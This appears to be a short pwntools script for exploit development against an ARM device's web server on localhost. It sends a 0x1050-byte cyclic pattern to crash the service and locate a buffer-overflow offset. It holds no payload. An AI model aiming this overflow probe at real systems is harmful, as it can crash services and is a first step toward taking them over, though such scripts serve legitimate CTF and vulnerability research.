from pwn import *
context(arch='arm',log_level='debug')

conn = remote('127.0.0.1',80)

def str2byte(s):
    return str.encode(s)

def request(socketfd,boby,path='/'):
    #request = b'GET ' + str2byte(path) + b' HTTP/1.1\r\nContent-Length: ' + str2byte(str(len(boby))) + b'\r\n\r\n' + boby
    request =  boby
    socketfd.sendline(request)
    socketfd.recv()

test = cyclic(0x1050)
boby= test

request(conn,boby)
